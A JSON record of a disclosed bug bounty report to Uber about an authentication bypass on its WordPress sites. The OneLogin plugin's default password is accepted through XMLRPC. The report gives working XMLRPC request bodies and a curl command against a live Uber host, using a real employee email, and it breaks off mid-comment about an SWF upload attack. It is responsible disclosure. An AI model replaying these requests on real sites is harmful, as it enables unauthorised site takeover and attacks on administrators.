{"id":138869,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzg4Njk=","url":"https://hackerone.com/reports/138869","title":"OneLogin authentication bypass on WordPress sites via XMLRPC","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-15T00:03:20.825Z","submitted_at":"2016-05-15T00:03:20.825Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jouko","url":"/jouko","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-07-15T22:04:09.271Z","bug_reporter_agreed_on_going_public_at":"2016-06-28T17:35:32.085Z","team_member_agreed_on_going_public_at":"2016-07-15T22:04:09.137Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"When a user logs on one of your WordPress sites via OneLogin, the authentication plugin creates a new entry in the WordPress user database with the default password `@@@nopass@@@`. This wouldn't be a problem if the plugin disabled all normal WordPress authentication methods, but it doesn't.\n\nThe OneLogin plugin does prevent logins through the normal *wp-login.php* page but fails to restrict the XMLRPC API. XMLRPC still honors the WordPress internal user database. Depending on the plugin settings, also the normal login page can be used with URL parameters: `wp-login.php?normal=1`. The settings did not allow this on the Uber sites I tried.\n\nAn attacker can exploit this bug by performing XMLRPC functions such as create new pages or posts and upload files. The attacker has to guess or know a username that has a default password and sufficient privileges to execute the operation. I haven't done an exhaustive test of all functions but some of them could probably be used to achieve remote code execution (e.g. creating posts containing JavaScript).\n\nThis probably affects most of your WordPress sites. I've confirmed this on *love.uber.com* and *newsroom.uber.com* by creating pages and posts (not public) and uploading files.\n\nThe XMLRPC system supports about 80 functions by default. Almost all of them require authentication. Plugins may add their own functions. Some of the function names:\n~~~~\nwp.deleteFile\nwp.editComment\nwp.getOptions\nwp.getUsers\nwp.newPage\nwp.newPost\nwp.setOptions\nwp.uploadFile\n~~~~\n#Reproducing#\nCreate an XML file named `options.xml` containing:\n~~~~ xml\n\u003c?xml version=\"1.0\"?\u003e\n\u003cmethodCall\u003e\n\u003cmethodName\u003ewp.getOptions\u003c/methodName\u003e\n\u003cparams\u003e\n\t\u003cparam\u003e\u003cvalue\u003ezzz\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cvalue\u003ecbarry@uber.com\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cvalue\u003e@@@nopass@@@\u003c/value\u003e\u003c/param\u003e\n\u003c/params\u003e\n\u003c/methodCall\u003e\n~~~~\nRun the UNIX command:\n~~~~ sh\ncurl 'https://newsroom.uber.com/xmlrpc.php' --data-binary \"`cat options.xml`\" -H 'Content-type: application/xml'\n~~~~\nYou should get the response:\n~~~~ xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003cmethodResponse\u003e\n  \u003cparams\u003e\n    \u003cparam\u003e\n      \u003cvalue\u003e\n      \u003cstruct\u003e\n  \u003cmember\u003e\u003cname\u003esoftware_name\u003c/name\u003e\u003cvalue\u003e\u003cstruct\u003e\n  \u003cmember\u003e\u003cname\u003edesc\u003c/name\u003e\u003cvalue\u003e\u003cstring\u003eSoftware Name\u003c/string\u003e\u003c/value\u003e\u003c/member\u003e\n  \u003cmember\u003e\u003cname\u003ereadonly\u003c/name\u003e\u003cvalue\u003e\u003cboolean\u003e1\u003c/boolean\u003e\u003c/value\u003e\u003c/member\u003e\n  \u003cmember\u003e\u003cname\u003evalue\u003c/name\u003e\u003cvalue\u003e\u003cstring\u003eWordPress\u003c/string\u003e\u003c/value\u003e\u003c/member\u003e\n\u003c/struct\u003e\u003c/value\u003e\u003c/member\u003e\n  \u003cmember\u003e\u003cname\u003esoftware_version\u003c/name\u003e\u003cvalue\u003e\u003cstruct\u003e\n  \u003cmember\u003e\u003cname\u003edesc\u003c/name\u003e\u003cvalue\u003e\u003cstring\u003eSoftware Version\u003c/string\u003e\u003c/value\u003e\u003c/member\u003e\n  \u003cmember\u003e\u003cname\u003ereadonly\u003c/name\u003e\u003cvalue\u003e\u003cboolean\u003e1\u003c/boolean\u003e\u003c/value\u003e\u003c/member\u003e\n  \u003cmember\u003e\u003cname\u003evalue\u003c/name\u003e\u003cvalue\u003e\u003cstring\u003e4.4.3\u003c/string\u003e\u003c/value\u003e\u003c/member\u003e\n\u003c/struct\u003e\u003c/value\u003e\u003c/member\u003e\n  \u003cmember\u003e\u003cname\u003eblog_url\u003c/name\u003e\u003cvalue\u003e\u003cstruct\u003e\n  \u003cmember\u003e\u003cname\u003edesc\u003c/name\u003e\u003cvalue\u003e\u003cstring\u003eWordPress Address (URL)\u003c/string\u003e\u003c/value\u003e\u003c/member\u003e\n  \u003cmember\u003e\u003cname\u003ereadonly\u003c/name\u003e\u003cvalue\u003e\u003cboolean\u003e1\u003c/boolean\u003e\u003c/value\u003e\u003c/member\u003e\n  \u003cmember\u003e\u003cname\u003evalue\u003c/name\u003e\u003cvalue\u003e\u003cstring\u003ehttps://newsroom.uber.com\u003c/string\u003e\u003c/value\u003e\u003c/member\u003e\n...etc.\n~~~~\n#Exploit scenarios#\nOptions in the above output that aren't marked *readonly* can also be changed. I didn't check if this is exploitable.\n\nFor usernames in these PoCs I used some *@uber.com email addresses I saw while testing previous bugs. They would be relatively easily guessable/findable for an attacker who doesn't have this information.\n\nA new post can be created with the following request. Without supplying a `post_status` parameter it will be saved as a draft, otherwise it will be published. It's also possible to create private posts too, e.g. for XSS-type attacks targeting administrators. The ability to create pages or posts depends on the user's privileges.\n~~~~ xml\n\u003c?xml version=\"1.0\"?\u003e\n\u003cmethodCall\u003e\n\u003cmethodName\u003ewp.newPost\u003c/methodName\u003e\n\u003cparams\u003e\n        \u003cparam\u003e\u003cvalue\u003ewhat is this parameter\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cvalue\u003e(INSERT USERNAME)\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cvalue\u003e@@@nopass@@@\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cstruct\u003e\n                \u003cmember\u003e\u003cname\u003epost_title\u003c/name\u003e\u003cvalue\u003ebugbounty test post\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003epost_content\u003c/name\u003e\u003cvalue\u003eany HTML content here\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003epost_excerpt\u003c/name\u003e\u003cvalue\u003eexcerpt\u003c/value\u003e\u003c/member\u003e\n        \u003c/struct\u003e\u003c/param\u003e\n\u003c/params\u003e\n\u003c/methodCall\u003e\n~~~~\nI've created some pages/posts on the said systems. As I saved them as drafts they can't be seen by normal users, but should be visible to administrators:\n* https://love.uber.com/australia/?page_id=6085\n* https://newsroom.uber.com/us-new-york/?p=2567\n\nA file can be uploaded with a request like this:\n~~~~ xml\n\u003c?xml version=\"1.0\"?\u003e\n\u003cmethodCall\u003e\n\u003cmethodName\u003emetaWeblog.newMediaObject\u003c/methodName\u003e\n\u003cparams\u003e\n        \u003cparam\u003e\u003cvalue\u003ewhat is this parameter\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cvalue\u003e(INSERT USERNAME)\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cvalue\u003e@@@nopass@@@\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cstruct\u003e\n                \u003cmember\u003e\u003cname\u003ename\u003c/name\u003e\u003cvalue\u003efile_name.html\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003etype\u003c/name\u003e\u003cvalue\u003etext/plain\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003ebits\u003c/name\u003e\u003cvalue\u003efile contents, any data format XML-encoded\u003c/value\u003e\u003c/member\u003e\n        \u003c/struct\u003e\u003c/param\u003e\n\u003c/params\u003e\n\u003c/methodCall\u003e\n~~~~\nThe ability to upload files and the allowed file extensions depend on the user privileges and WordPress settings.\n\nAs a PoC I uploaded a file: https://love.uber.com/wp-content/uploads/sites/5/2016/05/fooasfasfgdg.key\nI tried a few file extensions but most were denied on that server. Depending on the server and WordPress configuration and the user's privileges, this may be used to perform various attacks such as XSS via *.html or *.swf or theoretically even direct RCE if the web server handles some of the allowed file formats as scripts or executables. ","vulnerability_information_html":"\u003cp\u003eWhen a user logs on one of your WordPress sites via OneLogin, the authentication plugin creates a new entry in the WordPress user database with the default password \u003ccode\u003e@@@nopass@@@\u003c/code\u003e. This wouldn\u0026#39;t be a problem if the plugin disabled all normal WordPress authentication methods, but it doesn\u0026#39;t.\u003c/p\u003e\n\n\u003cp\u003eThe OneLogin plugin does prevent logins through the normal \u003cem\u003ewp-login.php\u003c/em\u003e page but fails to restrict the XMLRPC API. XMLRPC still honors the WordPress internal user database. Depending on the plugin settings, also the normal login page can be used with URL parameters: \u003ccode\u003ewp-login.php?normal=1\u003c/code\u003e. The settings did not allow this on the Uber sites I tried.\u003c/p\u003e\n\n\u003cp\u003eAn attacker can exploit this bug by performing XMLRPC functions such as create new pages or posts and upload files. The attacker has to guess or know a username that has a default password and sufficient privileges to execute the operation. I haven\u0026#39;t done an exhaustive test of all functions but some of them could probably be used to achieve remote code execution (e.g. creating posts containing JavaScript).\u003c/p\u003e\n\n\u003cp\u003eThis probably affects most of your WordPress sites. I\u0026#39;ve confirmed this on \u003cem\u003elove.uber.com\u003c/em\u003e and \u003cem\u003enewsroom.uber.com\u003c/em\u003e by creating pages and posts (not public) and uploading files.\u003c/p\u003e\n\n\u003cp\u003eThe XMLRPC system supports about 80 functions by default. Almost all of them require authentication. Plugins may add their own functions. Some of the function names:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ewp.deleteFile\nwp.editComment\nwp.getOptions\nwp.getUsers\nwp.newPage\nwp.newPost\nwp.setOptions\nwp.uploadFile\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"reproducing\"\u003eReproducing\u003c/h1\u003e\n\n\u003cp\u003eCreate an XML file named \u003ccode\u003eoptions.xml\u003c/code\u003e containing:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodCall\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodName\u0026gt;\u003c/span\u003ewp.getOptions\u003cspan class=\"nt\"\u003e\u0026lt;/methodName\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;params\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003ezzz\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003ecbarry@uber.com\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003e@@@nopass@@@\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/params\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/methodCall\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRun the UNIX command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"s1\"\u003e\u0026#39;https://newsroom.uber.com/xmlrpc.php\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--data-binary\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"nb\"\u003ecat \u003c/span\u003eoptions.xml\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-type: application/xml\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou should get the response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodResponse\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;params\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;value\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;struct\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003esoftware_name\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;struct\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003edesc\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;string\u0026gt;\u003c/span\u003eSoftware Name\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003ereadonly\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;boolean\u0026gt;\u003c/span\u003e1\u003cspan class=\"nt\"\u003e\u0026lt;/boolean\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003evalue\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;string\u0026gt;\u003c/span\u003eWordPress\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/struct\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003esoftware_version\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;struct\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003edesc\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;string\u0026gt;\u003c/span\u003eSoftware Version\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003ereadonly\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;boolean\u0026gt;\u003c/span\u003e1\u003cspan class=\"nt\"\u003e\u0026lt;/boolean\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003evalue\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;string\u0026gt;\u003c/span\u003e4.4.3\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/struct\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003eblog_url\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;struct\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003edesc\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;string\u0026gt;\u003c/span\u003eWordPress Address (URL)\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003ereadonly\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;boolean\u0026gt;\u003c/span\u003e1\u003cspan class=\"nt\"\u003e\u0026lt;/boolean\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003evalue\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u0026lt;string\u0026gt;\u003c/span\u003ehttps://newsroom.uber.com\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n...etc.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"exploit-scenarios\"\u003eExploit scenarios\u003c/h1\u003e\n\n\u003cp\u003eOptions in the above output that aren\u0026#39;t marked \u003cem\u003ereadonly\u003c/em\u003e can also be changed. I didn\u0026#39;t check if this is exploitable.\u003c/p\u003e\n\n\u003cp\u003eFor usernames in these PoCs I used some *@uber.com email addresses I saw while testing previous bugs. They would be relatively easily guessable/findable for an attacker who doesn\u0026#39;t have this information.\u003c/p\u003e\n\n\u003cp\u003eA new post can be created with the following request. Without supplying a \u003ccode\u003epost_status\u003c/code\u003e parameter it will be saved as a draft, otherwise it will be published. It\u0026#39;s also possible to create private posts too, e.g. for XSS-type attacks targeting administrators. The ability to create pages or posts depends on the user\u0026#39;s privileges.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodCall\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodName\u0026gt;\u003c/span\u003ewp.newPost\u003cspan class=\"nt\"\u003e\u0026lt;/methodName\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;params\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003ewhat is this parameter\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003e(INSERT USERNAME)\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003e@@@nopass@@@\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;struct\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_title\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003ebugbounty test post\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_content\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003eany HTML content here\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_excerpt\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003eexcerpt\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/struct\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/params\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/methodCall\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI\u0026#39;ve created some pages/posts on the said systems. As I saved them as drafts they can\u0026#39;t be seen by normal users, but should be visible to administrators:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://love.uber.com/australia/?page_id=6085\" href=\"/redirect?url=https%3A%2F%2Flove.uber.com%2Faustralia%2F%3Fpage_id%3D6085\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://love.uber.com/australia/?page_id=6085\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://newsroom.uber.com/us-new-york/?p=2567\" href=\"/redirect?url=https%3A%2F%2Fnewsroom.uber.com%2Fus-new-york%2F%3Fp%3D2567\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://newsroom.uber.com/us-new-york/?p=2567\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eA file can be uploaded with a request like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodCall\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodName\u0026gt;\u003c/span\u003emetaWeblog.newMediaObject\u003cspan class=\"nt\"\u003e\u0026lt;/methodName\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;params\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003ewhat is this parameter\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003e(INSERT USERNAME)\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003e@@@nopass@@@\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;struct\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003ename\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003efile_name.html\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003etype\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003etext/plain\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003ebits\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003efile contents, any data format XML-encoded\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/struct\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/params\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/methodCall\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe ability to upload files and the allowed file extensions depend on the user privileges and WordPress settings.\u003c/p\u003e\n\n\u003cp\u003eAs a PoC I uploaded a file: \u003ca title=\"https://love.uber.com/wp-content/uploads/sites/5/2016/05/fooasfasfgdg.key\" href=\"/redirect?url=https%3A%2F%2Flove.uber.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2016%2F05%2Ffooasfasfgdg.key\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://love.uber.com/wp-content/uploads/sites/5/2016/05/fooasfasfgdg.key\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nI tried a few file extensions but most were denied on that server. Depending on the server and WordPress configuration and the user\u0026#39;s privileges, this may be used to perform various attacks such as XSS via *.html or *.swf or theoretically even direct RCE if the web server handles some of the allowed file formats as scripts or executables. \u003c/p\u003e\n","bounty_amount":"7000.0","formatted_bounty":"$7,000","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-07-28T17:35:32.175Z","allow_singular_disclosure_after":-139488717.79171437,"singular_disclosure_allowed":true,"vote_count":65,"voters":["sultancad","bobrov","hunter","michiel","shailesh4594","wkcaj","sameerphad72","mongo","zombiehelp54","patrik","and 55 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":958145,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"After some problems with XML encoding I was able to upload a working SWF file on *newsroom.uber.com*. The file extension and Content-type given by the server are that of a MS Word document but embedding the uploaded SWF file is still possible.\n\nIf a victim views such Flash app while logged on, then the attacker can send GET and POST requests on their behalf with appropriate cookies. If it's an administrator, then the site contents, settings, and user accounts can be modified and the server probably compromised.\n\nI made a 